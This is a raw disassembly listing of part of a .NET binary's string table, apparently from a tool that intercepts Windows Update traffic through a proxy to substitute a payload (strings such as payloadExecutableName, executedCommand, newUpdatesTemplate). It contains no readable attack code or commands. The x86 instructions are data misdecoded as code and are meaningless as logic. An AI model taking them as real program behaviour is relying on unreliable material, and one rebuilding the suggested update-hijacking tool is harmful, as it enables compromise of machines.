  4064e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4064e1:	73 74                	jae    0x406557
  4064e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4064e4:	61                   	popa
  4064e5:	6d                   	insl   (%dx),%es:(%edi)
  4064e6:	65 3e 35 5f 5f 32 00 	gs ds xor $0x325f5f,%eax
  4064ed:	3c 63                	cmp    $0x63,%al
  4064ef:	6c                   	insb   (%dx),%es:(%edi)
  4064f0:	69 65 6e 74 4c 6f 63 	imul   $0x636f4c74,0x6e(%ebp),%esp
  4064f7:	61                   	popa
  4064f8:	6c                   	insb   (%dx),%es:(%edi)
  4064f9:	49                   	dec    %ecx
  4064fa:	70 3e                	jo     0x40653a
  4064fc:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  406501:	3c 62                	cmp    $0x62,%al
  406503:	6f                   	outsl  %ds:(%esi),(%dx)
  406504:	64 79 42             	fs jns 0x406549
  406507:	79 74                	jns    0x40657d
  406509:	65 73 3e             	gs jae 0x40654a
  40650c:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  406511:	3c 63                	cmp    $0x63,%al
  406513:	74 78                	je     0x40658d
  406515:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  40651b:	3c 3e                	cmp    $0x3e,%al
  40651d:	75 5f                	jne    0x40657e
  40651f:	5f                   	pop    %edi
  406520:	32 00                	xor    (%eax),%al
  406522:	46                   	inc    %esi
  406523:	75 6e                	jne    0x406593
  406525:	63 60 32             	arpl   %esp,0x32(%eax)
  406528:	00 44 69 63          	add    %al,0x63(%ecx,%ebp,2)
  40652c:	74 69                	je     0x406597
  40652e:	6f                   	outsl  %ds:(%esi),(%dx)
  40652f:	6e                   	outsb  %ds:(%esi),(%dx)
  406530:	61                   	popa
  406531:	72 79                	jb     0x4065ac
  406533:	60                   	pusha
  406534:	32 00                	xor    (%eax),%al
  406536:	75 75                	jne    0x4065ad
  406538:	69 64 32 00 67 65 74 	imul   $0x5f746567,0x0(%edx,%esi,1),%esp
  40653f:	5f 
  406540:	50                   	push   %eax
  406541:	72 69                	jb     0x4065ac
  406543:	6d                   	insl   (%dx),%es:(%edi)
  406544:	65 32 00             	xor    %gs:(%eax),%al
  406547:	58                   	pop    %eax
  406548:	35 30 39 43 65       	xor    $0x65433930,%eax
  40654d:	72 74                	jb     0x4065c3
  40654f:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406556:	32 00                	xor    (%eax),%al
  406558:	67 65 74 5f          	addr16 gs je 0x4065bb
  40655c:	45                   	inc    %ebp
  40655d:	78 70                	js     0x4065cf
  40655f:	6f                   	outsl  %ds:(%esi),(%dx)
  406560:	6e                   	outsb  %ds:(%esi),(%dx)
  406561:	65 6e                	outsb  %gs:(%esi),(%dx)
  406563:	74 32                	je     0x406597
  406565:	00 3c 73             	add    %bh,(%ebx,%esi,2)
  406568:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  40656c:	64 50                	fs push %eax
  40656e:	68 61 73 65 54       	push   $0x54657361
  406573:	65 6d                	gs insl (%dx),%es:(%edi)
  406575:	70 6c                	jo     0x4065e3
  406577:	61                   	popa
  406578:	74 65                	je     0x4065df
  40657a:	3e 35 5f 5f 31 33    	ds xor $0x33315f5f,%eax
  406580:	00 3c 72             	add    %bh,(%edx,%esi,2)
  406583:	65 71 3e             	gs jno 0x4065c4
  406586:	35 5f 5f 33 00       	xor    $0x335f5f,%eax
  40658b:	3c 72                	cmp    $0x72,%al
  40658d:	65 71 75             	gs jno 0x406605
  406590:	65 73 74             	gs jae 0x406607
  406593:	42                   	inc    %edx
  406594:	6f                   	outsl  %ds:(%esi),(%dx)
  406595:	64 79 3e             	fs jns 0x4065d6
  406598:	35 5f 5f 33 00       	xor    $0x335f5f,%eax
  40659d:	3c 53                	cmp    $0x53,%al
  40659f:	74 61                	je     0x406602
  4065a1:	72 74                	jb     0x406617
  4065a3:	3e 64 5f             	ds fs pop %edi
  4065a6:	5f                   	pop    %edi
  4065a7:	33 00                	xor    (%eax),%eax
  4065a9:	3c 3e                	cmp    $0x3e,%al
  4065ab:	73 5f                	jae    0x40660c
  4065ad:	5f                   	pop    %edi
  4065ae:	33 00                	xor    (%eax),%eax
  4065b0:	73 65                	jae    0x406617
  4065b2:	74 5f                	je     0x406613
  4065b4:	43                   	inc    %ebx
  4065b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4065b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4065b7:	74 65                	je     0x40661e
  4065b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4065ba:	74 4c                	je     0x406608
  4065bc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4065be:	67 74 68             	addr16 je 0x406629
  4065c1:	36 34 00             	ss xor $0x0,%al
  4065c4:	3c 73                	cmp    $0x73,%al
  4065c6:	74 72                	je     0x40663a
  4065c8:	65 61                	gs popa
  4065ca:	6d                   	insl   (%dx),%es:(%edi)
  4065cb:	3e 35 5f 5f 34 00    	ds xor $0x345f5f,%eax
  4065d1:	3c 72                	cmp    $0x72,%al
  4065d3:	65 73 70             	gs jae 0x406646
  4065d6:	3e 35 5f 5f 34 00    	ds xor $0x345f5f,%eax
  4065dc:	3c 3e                	cmp    $0x3e,%al
  4065de:	73 5f                	jae    0x40663f
  4065e0:	5f                   	pop    %edi
  4065e1:	34 00                	xor    $0x0,%al
  4065e3:	3c 64                	cmp    $0x64,%al
  4065e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4065e6:	63 3e                	arpl   %edi,(%esi)
  4065e8:	35 5f 5f 35 00       	xor    $0x355f5f,%eax
  4065ed:	3c 3e                	cmp    $0x3e,%al
  4065ef:	73 5f                	jae    0x406650
  4065f1:	5f                   	pop    %edi
  4065f2:	35 00 3c 6f 6e       	xor    $0x6e6f3c00,%eax
  4065f7:	42                   	inc    %edx
  4065f8:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  4065fb:	72 65                	jb     0x406662
  4065fd:	54                   	push   %esp
  4065fe:	75 6e                	jne    0x40666e
  406600:	6e                   	outsb  %ds:(%esi),(%dx)
  406601:	65 6c                	gs insb (%dx),%es:(%edi)
  406603:	43                   	inc    %ebx
  406604:	6f                   	outsl  %ds:(%esi),(%dx)
  406605:	6e                   	outsb  %ds:(%esi),(%dx)
  406606:	6e                   	outsb  %ds:(%esi),(%dx)
  406607:	65 63 74 52 65       	arpl   %esi,%gs:0x65(%edx,%edx,2)
  40660c:	71 75                	jno    0x406683
  40660e:	65 73 74             	gs jae 0x406685
  406611:	3e 64 5f             	ds fs pop %edi
  406614:	5f                   	pop    %edi
  406615:	32 36                	xor    (%esi),%dh
  406617:	00 70 61             	add    %dh,0x61(%eax)
  40661a:	79 6c                	jns    0x406688
  40661c:	6f                   	outsl  %ds:(%esi),(%dx)
  40661d:	61                   	popa
  40661e:	64 53                	fs push %ebx
  406620:	48                   	dec    %eax
  406621:	41                   	inc    %ecx
  406622:	32 35 36 00 3c 73    	xor    0x733c0036,%dh
  406628:	79 6e                	jns    0x406698
  40662a:	63 55 70             	arpl   %edx,0x70(%ebp)
  40662d:	64 61                	fs popa
  40662f:	74 65                	je     0x406696
  406631:	73 52                	jae    0x406685
  406633:	65 73 75             	gs jae 0x4066ab
  406636:	6c                   	insb   (%dx),%es:(%edi)
  406637:	74 3e                	je     0x406677
  406639:	35 5f 5f 36 00       	xor    $0x365f5f,%eax
  40663e:	3c 6f                	cmp    $0x6f,%al
  406640:	6e                   	outsb  %ds:(%esi),(%dx)
  406641:	52                   	push   %edx
  406642:	65 71 75             	gs jno 0x4066ba
  406645:	65 73 74             	gs jae 0x4066bc
  406648:	3e 64 5f             	ds fs pop %edi
  40664b:	5f                   	pop    %edi
  40664c:	32 37                	xor    (%edi),%dh
  40664e:	00 3c 6e             	add    %bh,(%esi,%ebp,2)
  406651:	73 3e                	jae    0x406691
  406653:	35 5f 5f 37 00       	xor    $0x375f5f,%eax
  406658:	3c 6f                	cmp    $0x6f,%al
  40665a:	6e                   	outsb  %ds:(%esi),(%dx)
  40665b:	52                   	push   %edx
  40665c:	65 73 70             	gs jae 0x4066cf
  40665f:	6f                   	outsl  %ds:(%esi),(%dx)
  406660:	6e                   	outsb  %ds:(%esi),(%dx)
  406661:	73 65                	jae    0x4066c8
  406663:	3e 64 5f             	ds fs pop %edi
  406666:	5f                   	pop    %edi
  406667:	32 38                	xor    (%eax),%bh
  406669:	00 67 65             	add    %ah,0x65(%edi)
  40666c:	74 5f                	je     0x4066cd
  40666e:	55                   	push   %ebp
  40666f:	54                   	push   %esp
  406670:	46                   	inc    %esi
  406671:	38 00                	cmp    %al,(%eax)
  406673:	3c 6e                	cmp    $0x6e,%al
  406675:	65 77 55             	gs ja  0x4066cd
  406678:	70 64                	jo     0x4066de
  40667a:	61                   	popa
  40667b:	74 65                	je     0x4066e2
  40667d:	73 54                	jae    0x4066d3
  40667f:	65 6d                	gs insl (%dx),%es:(%edi)
  406681:	70 6c                	jo     0x4066ef
  406683:	61                   	popa
  406684:	74 65                	je     0x4066eb
  406686:	3e 35 5f 5f 38 00    	ds xor $0x385f5f,%eax
  40668c:	4f                   	dec    %edi
  40668d:	72 67                	jb     0x4066f6
  40668f:	2e 42                	cs inc %edx
  406691:	6f                   	outsl  %ds:(%esi),(%dx)
  406692:	75 6e                	jne    0x406702
  406694:	63 79 43             	arpl   %edi,0x43(%ecx)
  406697:	61                   	popa
  406698:	73 74                	jae    0x40670e
  40669a:	6c                   	insb   (%dx),%es:(%edi)
  40669b:	65 2e 41             	gs cs inc %ecx
  40669e:	73 6e                	jae    0x40670e
  4066a0:	31 2e                	xor    %ebp,(%esi)
  4066a2:	58                   	pop    %eax
  4066a3:	35 30 39 00 4f       	xor    $0x4f003930,%eax
  4066a8:	72 67                	jb     0x406711
  4066aa:	2e 42                	cs inc %edx
  4066ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ad:	75 6e                	jne    0x40671d
  4066af:	63 79 43             	arpl   %edi,0x43(%ecx)
  4066b2:	61                   	popa
  4066b3:	73 74                	jae    0x406729
  4066b5:	6c                   	insb   (%dx),%es:(%edi)
  4066b6:	65 2e 58             	gs cs pop %eax
  4066b9:	35 30 39 00 3c       	xor    $0x3c003930,%eax
  4066be:	77 72                	ja     0x406732
  4066c0:	69 74 65 44 65 62 75 	imul   $0x67756265,0x44(%ebp,%eiz,2),%esi
  4066c7:	67 
  4066c8:	54                   	push   %esp
  4066c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ca:	43                   	inc    %ebx
  4066cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4066cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4066cd:	73 6f                	jae    0x40673e
  4066cf:	6c                   	insb   (%dx),%es:(%edi)
  4066d0:	65 3e 64 5f          	gs ds fs pop %edi
  4066d4:	5f                   	pop    %edi
  4066d5:	32 39                	xor    (%ecx),%bh
  4066d7:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4066da:	39 00                	cmp    %eax,(%eax)
  4066dc:	3c 69                	cmp    $0x69,%al
  4066de:	6d                   	insl   (%dx),%es:(%edi)
  4066df:	70 6f                	jo     0x406750
  4066e1:	72 74                	jb     0x406757
  4066e3:	65 64 4e             	gs fs dec %esi
  4066e6:	65 77 55             	gs ja  0x40673e
  4066e9:	70 64                	jo     0x40674f
  4066eb:	61                   	popa
  4066ec:	74 65                	je     0x406753
  4066ee:	73 4e                	jae    0x40673e
  4066f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4066f1:	64 65 3e 35 5f 5f 39 	fs gs ds xor $0x395f5f,%eax
  4066f8:	00 
  4066f9:	3c 4d                	cmp    $0x4d,%al
  4066fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4066fc:	64 75 6c             	fs jne 0x40676b
  4066ff:	65 3e 00 49 4e       	gs add %cl,%ds:0x4e(%ecx)
  406704:	54                   	push   %esp
  406705:	45                   	inc    %ebp
  406706:	52                   	push   %edx
  406707:	4e                   	dec    %esi
  406708:	45                   	inc    %ebp
  406709:	54                   	push   %esp
  40670a:	5f                   	pop    %edi
  40670b:	4f                   	dec    %edi
  40670c:	50                   	push   %eax
  40670d:	54                   	push   %esp
  40670e:	49                   	dec    %ecx
  40670f:	4f                   	dec    %edi
  406710:	4e                   	dec    %esi
  406711:	5f                   	pop    %edi
  406712:	53                   	push   %ebx
  406713:	45                   	inc    %ebp
  406714:	54                   	push   %esp
  406715:	54                   	push   %esp
  406716:	49                   	dec    %ecx
  406717:	4e                   	dec    %esi
  406718:	47                   	inc    %edi
  406719:	53                   	push   %ebx
  40671a:	5f                   	pop    %edi
  40671b:	43                   	inc    %ebx
  40671c:	48                   	dec    %eax
  40671d:	41                   	inc    %ecx
  40671e:	4e                   	dec    %esi
  40671f:	47                   	inc    %edi
  406720:	45                   	inc    %ebp
  406721:	44                   	inc    %esp
  406722:	00 4b 65             	add    %cl,0x65(%ebx)
  406725:	79 50                	jns    0x406777
  406727:	75 72                	jne    0x40679b
  406729:	70 6f                	jo     0x40679a
  40672b:	73 65                	jae    0x406792
  40672d:	49                   	dec    %ecx
  40672e:	44                   	inc    %esp
  40672f:	00 49 4e             	add    %cl,0x4e(%ecx)
  406732:	54                   	push   %esp
  406733:	45                   	inc    %ebp
  406734:	52                   	push   %edx
  406735:	4e                   	dec    %esi
  406736:	45                   	inc    %ebp
  406737:	54                   	push   %esp
  406738:	5f                   	pop    %edi
  406739:	4f                   	dec    %edi
  40673a:	50                   	push   %eax
  40673b:	54                   	push   %esp
  40673c:	49                   	dec    %ecx
  40673d:	4f                   	dec    %edi
  40673e:	4e                   	dec    %esi
  40673f:	5f                   	pop    %edi
  406740:	52                   	push   %edx
  406741:	45                   	inc    %ebp
  406742:	46                   	inc    %esi
  406743:	52                   	push   %edx
  406744:	45                   	inc    %ebp
  406745:	53                   	push   %ebx
  406746:	48                   	dec    %eax
  406747:	00 53 65             	add    %dl,0x65(%ebx)
  40674a:	74 49                	je     0x406795
  40674c:	73 73                	jae    0x4067c1
  40674e:	75 65                	jne    0x4067b5
  406750:	72 44                	jb     0x406796
  406752:	4e                   	dec    %esi
  406753:	00 67 65             	add    %ah,0x65(%edi)
  406756:	74 5f                	je     0x4067b7
  406758:	53                   	push   %ebx
  406759:	75 62                	jne    0x4067bd
  40675b:	6a 65                	push   $0x65
  40675d:	63 74 44 4e          	arpl   %esi,0x4e(%esp,%eax,2)
  406761:	00 53 65             	add    %dl,0x65(%ebx)
  406764:	74 53                	je     0x4067b9
  406766:	75 62                	jne    0x4067ca
  406768:	6a 65                	push   $0x65
  40676a:	63 74 44 4e          	arpl   %esi,0x4e(%esp,%eax,2)
  40676e:	00 53 79             	add    %dl,0x79(%ebx)
  406771:	73 74                	jae    0x4067e7
  406773:	65 6d                	gs insl (%dx),%es:(%edi)
  406775:	2e 49                	cs dec %ecx
  406777:	4f                   	dec    %edi
  406778:	00 73 65             	add    %dh,0x65(%ebx)
  40677b:	74 48                	je     0x4067c5
  40677d:	54                   	push   %esp
  40677e:	54                   	push   %esp
  40677f:	50                   	push   %eax
  406780:	53                   	push   %ebx
  406781:	00 66 69             	add    %ah,0x69(%esi)
  406784:	6c                   	insb   (%dx),%es:(%edi)
  406785:	65 44                	gs inc %esp
  406787:	61                   	popa
  406788:	74 61                	je     0x4067eb
  40678a:	00 6d 73             	add    %ch,0x73(%ebp)
  40678d:	63 6f 72             	arpl   %ebp,0x72(%edi)
  406790:	6c                   	insb   (%dx),%es:(%edi)
  406791:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
  406798:	67 65 74 5f          	addr16 gs je 0x4067fb
  40679c:	50                   	push   %eax
  40679d:	75 62                	jne    0x406801
  40679f:	6c                   	insb   (%dx),%es:(%edi)
  4067a0:	69 63 00 53 79 73 74 	imul   $0x74737953,0x0(%ebx),%esp
  4067a7:	65 6d                	gs insl (%dx),%es:(%edi)
  4067a9:	2e 43                	cs inc %ebx
  4067ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4067ac:	6c                   	insb   (%dx),%es:(%edi)
  4067ad:	6c                   	insb   (%dx),%es:(%edi)
  4067ae:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4067b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4067b4:	73 2e                	jae    0x4067e4
  4067b6:	47                   	inc    %edi
  4067b7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067b9:	65 72 69             	gs jb  0x406825
  4067bc:	63 00                	arpl   %eax,(%eax)
  4067be:	73 65                	jae    0x406825
  4067c0:	74 5f                	je     0x406821
  4067c2:	45                   	inc    %ebp
  4067c3:	78 63                	js     0x406828
  4067c5:	65 70 74             	gs jo  0x40683c
  4067c8:	69 6f 6e 46 75 6e 63 	imul   $0x636e7546,0x6e(%edi),%ebp
  4067cf:	00 57 72             	add    %dl,0x72(%edi)
  4067d2:	69 74 65 41 73 79 6e 	imul   $0x636e7973,0x41(%ebp,%eiz,2),%esi
  4067d9:	63 
  4067da:	00 57 61             	add    %dl,0x61(%edi)
  4067dd:	69 74 41 73 79 6e 63 	imul   $0x636e79,0x73(%ecx,%eax,2),%esi
  4067e4:	00 
  4067e5:	47                   	inc    %edi
  4067e6:	65 74 43             	gs je  0x40682c
  4067e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4067ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4067eb:	74 65                	je     0x406852
  4067ed:	78 74                	js     0x406863
  4067ef:	41                   	inc    %ecx
  4067f0:	73 79                	jae    0x40686b
  4067f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4067f3:	63 00                	arpl   %eax,(%eax)
  4067f5:	3c 3c                	cmp    $0x3c,%al
  4067f7:	2d 63 74 6f 72       	sub    $0x726f7463,%eax
  4067fc:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  406800:	32 32                	xor    (%edx),%dh
  406802:	5f                   	pop    %edi
  406803:	30 3e                	xor    %bh,(%esi)
  406805:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  406809:	74 5f                	je     0x40686a
  40680b:	49                   	dec    %ecx
  40680c:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  406810:	61                   	popa
  406811:	64 00 4c 6f 61       	add    %cl,%fs:0x61(%edi,%ebp,2)
  406816:	64 00 70 61          	add    %dh,%fs:0x61(%eax)
  40681a:	79 6c                	jns    0x406888
  40681c:	6f                   	outsl  %ds:(%esi),(%dx)
  40681d:	61                   	popa
  40681e:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  406822:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  406826:	74 44                	je     0x40686c
  406828:	65 72 45             	gs jb  0x406870
  40682b:	6e                   	outsb  %ds:(%esi),(%dx)
  40682c:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40682f:	65 64 00 70 72       	gs add %dh,%fs:0x72(%eax)
  406834:	6f                   	outsl  %ds:(%esi),(%dx)
  406835:	78 79                	js     0x4068b0
  406837:	45                   	inc    %ebp
  406838:	6e                   	outsb  %ds:(%esi),(%dx)
  406839:	61                   	popa
  40683a:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  40683e:	00 41 77             	add    %al,0x77(%ecx)
  406841:	61                   	popa
  406842:	69 74 55 6e 73 61 66 	imul   $0x65666173,0x6e(%ebp,%edx,2),%esi
  406849:	65 
  40684a:	4f                   	dec    %edi
  40684b:	6e                   	outsb  %ds:(%esi),(%dx)
  40684c:	43                   	inc    %ebx
  40684d:	6f                   	outsl  %ds:(%esi),(%dx)
  40684e:	6d                   	insl   (%dx),%es:(%edi)
  40684f:	70 6c                	jo     0x4068bd
  406851:	65 74 65             	gs je  0x4068b9
  406854:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  406858:	74 5f                	je     0x4068b9
  40685a:	49                   	dec    %ecx
  40685b:	73 43                	jae    0x4068a0
  40685d:	6f                   	outsl  %ds:(%esi),(%dx)
  40685e:	6d                   	insl   (%dx),%es:(%edi)
  40685f:	70 6c                	jo     0x4068cd
  406861:	65 74 65             	gs je  0x4068c9
  406864:	64 00 4e 65          	add    %cl,%fs:0x65(%esi)
  406868:	77 47                	ja     0x4068b1
  40686a:	75 69                	jne    0x4068d5
  40686c:	64 00 65 78          	add    %ah,%fs:0x78(%ebp)
  406870:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  406874:	65 64 43             	gs fs inc %ebx
  406877:	6f                   	outsl  %ds:(%esi),(%dx)
  406878:	6d                   	insl   (%dx),%es:(%edi)
  406879:	6d                   	insl   (%dx),%es:(%edi)
  40687a:	61                   	popa
  40687b:	6e                   	outsb  %ds:(%esi),(%dx)
  40687c:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  406880:	74 5f                	je     0x4068e1
  406882:	4d                   	dec    %ebp
  406883:	65 74 68             	gs je  0x4068ee
  406886:	6f                   	outsl  %ds:(%esi),(%dx)
  406887:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40688b:	70 6c                	jo     0x4068f9
  40688d:	61                   	popa
  40688e:	63 65 00             	arpl   %esp,0x0(%ebp)
  406891:	49                   	dec    %ecx
  406892:	73 4e                	jae    0x4068e2
  406894:	75 6c                	jne    0x406902
  406896:	6c                   	insb   (%dx),%es:(%edi)
  406897:	4f                   	dec    %edi
  406898:	72 57                	jb     0x4068f1
  40689a:	68 69 74 65 53       	push   $0x53657469
  40689f:	70 61                	jo     0x406902
  4068a1:	63 65 00             	arpl   %esp,0x0(%ebp)
  4068a4:	58                   	pop    %eax
  4068a5:	4e                   	dec    %esi
  4068a6:	61                   	popa
  4068a7:	6d                   	insl   (%dx),%es:(%edi)
  4068a8:	65 73 70             	gs jae 0x40691b
  4068ab:	61                   	popa
  4068ac:	63 65 00             	arpl   %esp,0x0(%ebp)
  4068af:	47                   	inc    %edi
  4068b0:	65 74 44             	gs je  0x4068f7
  4068b3:	65 66 61             	gs popaw
  4068b6:	75 6c                	jne    0x406924
  4068b8:	74 4e                	je     0x406908
  4068ba:	61                   	popa
  4068bb:	6d                   	insl   (%dx),%es:(%edi)
  4068bc:	65 73 70             	gs jae 0x40692f
  4068bf:	61                   	popa
  4068c0:	63 65 00             	arpl   %esp,0x0(%ebp)
  4068c3:	47                   	inc    %edi
  4068c4:	65 74 49             	gs je  0x406910
  4068c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4068c8:	73 74                	jae    0x40693e
  4068ca:	61                   	popa
  4068cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4068cc:	63 65 00             	arpl   %esp,0x0(%ebp)
  4068cf:	41                   	inc    %ecx
  4068d0:	73 6e                	jae    0x406940
  4068d2:	31 53 65             	xor    %edx,0x65(%ebx)
  4068d5:	71 75                	jno    0x40694c
  4068d7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068d9:	63 65 00             	arpl   %esp,0x0(%ebp)
  4068dc:	44                   	inc    %esp
  4068dd:	65 72 53             	gs jb  0x406933
  4068e0:	65 71 75             	gs jno 0x406958
  4068e3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068e5:	63 65 00             	arpl   %esp,0x0(%ebp)
  4068e8:	67 65 74 5f          	addr16 gs je 0x40694b
  4068ec:	53                   	push   %ebx
  4068ed:	74 61                	je     0x406950
  4068ef:	74 75                	je     0x406966
  4068f1:	73 43                	jae    0x406936
  4068f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4068f4:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  4068f9:	74 5f                	je     0x40695a
  4068fb:	53                   	push   %ebx
  4068fc:	74 61                	je     0x40695f
  4068fe:	74 75                	je     0x406975
  406900:	73 43                	jae    0x406945
  406902:	6f                   	outsl  %ds:(%esi),(%dx)
  406903:	64 65 00 58 4e       	fs add %bl,%gs:0x4e(%eax)
  406908:	6f                   	outsl  %ds:(%esi),(%dx)
  406909:	64 65 00 48 74       	fs add %cl,%gs:0x74(%eax)
  40690e:	6d                   	insl   (%dx),%es:(%edi)
  40690f:	6c                   	insb   (%dx),%es:(%edi)
  406910:	45                   	inc    %ebp
  406911:	6e                   	outsb  %ds:(%esi),(%dx)
  406912:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406915:	65 00 45 78          	add    %al,%gs:0x78(%ebp)
  406919:	74 65                	je     0x406980
  40691b:	6e                   	outsb  %ds:(%esi),(%dx)
  40691c:	64 65 64 4b          	fs gs fs dec %ebx
  406920:	65 79 55             	gs jns 0x406978
  406923:	73 61                	jae    0x406986
  406925:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  40692a:	74 5f                	je     0x40698b
  40692c:	4d                   	dec    %ebp
  40692d:	65 73 73             	gs jae 0x4069a3
  406930:	61                   	popa
  406931:	67 65 00 6d 65       	add    %ch,%gs:0x65(%di)
  406936:	73 73                	jae    0x4069ab
  406938:	61                   	popa
  406939:	67 65 00 43 72       	add    %al,%gs:0x72(%bp,%di)
  40693e:	65 61                	gs popa
  406940:	74 65                	je     0x4069a7
  406942:	52                   	push   %edx
  406943:	61                   	popa
  406944:	6e                   	outsb  %ds:(%esi),(%dx)
  406945:	64 6f                	outsl  %fs:(%esi),(%dx)
  406947:	6d                   	insl   (%dx),%es:(%edi)
  406948:	49                   	dec    %ecx
  406949:	6e                   	outsb  %ds:(%esi),(%dx)
  40694a:	52                   	push   %edx
  40694b:	61                   	popa
  40694c:	6e                   	outsb  %ds:(%esi),(%dx)
  40694d:	67 65 00 41 73       	add    %al,%gs:0x73(%bx,%di)
  406952:	6e                   	outsb  %ds:(%esi),(%dx)
  406953:	31 45 6e             	xor    %eax,0x6e(%ebp)
  406956:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406959:	61                   	popa
  40695a:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40695e:	47                   	inc    %edi
  40695f:	65 74 45             	gs je  0x4069a7
  406962:	6e                   	outsb  %ds:(%esi),(%dx)
  406963:	76 69                	jbe    0x4069ce
  406965:	72 6f                	jb     0x4069d6
  406967:	6e                   	outsb  %ds:(%esi),(%dx)
  406968:	6d                   	insl   (%dx),%es:(%edi)
  406969:	65 6e                	outsb  %gs:(%esi),(%dx)
  40696b:	74 56                	je     0x4069c3
  40696d:	61                   	popa
  40696e:	72 69                	jb     0x4069d9
  406970:	61                   	popa
  406971:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  406975:	45                   	inc    %ebp
  406976:	6e                   	outsb  %ds:(%esi),(%dx)
  406977:	75 6d                	jne    0x4069e6
  406979:	65 72 61             	gs jb  0x4069dd
  40697c:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  406980:	49                   	dec    %ecx
  406981:	44                   	inc    %esp
  406982:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  406989:	6c                   	insb   (%dx),%es:(%edi)
  40698a:	65 00 77 69          	add    %dh,%gs:0x69(%edi)
  40698e:	6e                   	outsb  %ds:(%esi),(%dx)
  40698f:	31 30                	xor    %esi,(%eax)
  406991:	45                   	inc    %ebp
  406992:	78 65                	js     0x4069f9
  406994:	63 75 74             	arpl   %esi,0x74(%ebp)
  406997:	61                   	popa
  406998:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40699c:	46                   	inc    %esi
  40699d:	69 6c 65 00 77 72 69 	imul   $0x74697277,0x0(%ebp,%eiz,2),%ebp
  4069a4:	74 
  4069a5:	65 54                	gs push %esp
  4069a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4069a8:	43                   	inc    %ebx
  4069a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4069aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4069ab:	73 6f                	jae    0x406a1c
  4069ad:	6c                   	insb   (%dx),%es:(%edi)
  4069ae:	65 00 77 72          	add    %dh,%gs:0x72(%edi)
  4069b2:	69 74 65 44 65 62 75 	imul   $0x67756265,0x44(%ebp,%eiz,2),%esi
  4069b9:	67 
  4069ba:	54                   	push   %esp
  4069bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4069bc:	43                   	inc    %ebx
  4069bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4069be:	6e                   	outsb  %ds:(%esi),(%dx)
  4069bf:	73 6f                	jae    0x406a30
  4069c1:	6c                   	insb   (%dx),%es:(%edi)
  4069c2:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4069c6:	30 39                	xor    %bh,(%ecx)
  4069c8:	4e                   	dec    %esi
  4069c9:	61                   	popa
  4069ca:	6d                   	insl   (%dx),%es:(%edi)
  4069cb:	65 00 58 4e          	add    %bl,%gs:0x4e(%eax)
  4069cf:	61                   	popa
  4069d0:	6d                   	insl   (%dx),%es:(%edi)
  4069d1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4069d5:	74 5f                	je     0x406a36
  4069d7:	4e                   	dec    %esi
  4069d8:	61                   	popa
  4069d9:	6d                   	insl   (%dx),%es:(%edi)
  4069da:	65 00 70 61          	add    %dh,%gs:0x61(%eax)
  4069de:	79 6c                	jns    0x406a4c
  4069e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4069e1:	61                   	popa
  4069e2:	64 45                	fs inc %ebp
  4069e4:	78 65                	js     0x406a4b
  4069e6:	63 75 74             	arpl   %esi,0x74(%ebp)
  4069e9:	61                   	popa
  4069ea:	62 6c 65 4e          	bound  %ebp,0x4e(%ebp,%eiz,2)
  4069ee:	61                   	popa
  4069ef:	6d                   	insl   (%dx),%es:(%edi)
  4069f0:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4069f4:	74 5f                	je     0x406a55
